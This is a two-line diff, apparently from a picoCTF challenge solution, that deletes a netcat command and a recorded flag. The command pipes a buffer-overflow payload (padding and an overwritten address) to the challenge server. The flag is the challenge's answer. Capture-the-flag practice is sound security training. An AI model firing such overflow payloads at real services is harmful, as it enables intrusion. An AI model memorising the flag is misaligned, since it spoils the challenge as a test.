@@ -1,2 +1,0 @@
-echo "2n0123456789012345678901234567890123\xa0\x11\x40\x00\x00\x00\x00\x00\n3\n4\n" | nc mimas.picoctf.net portn
-flag=picoCTF{and_down_the_road_we_go_ba77314d}
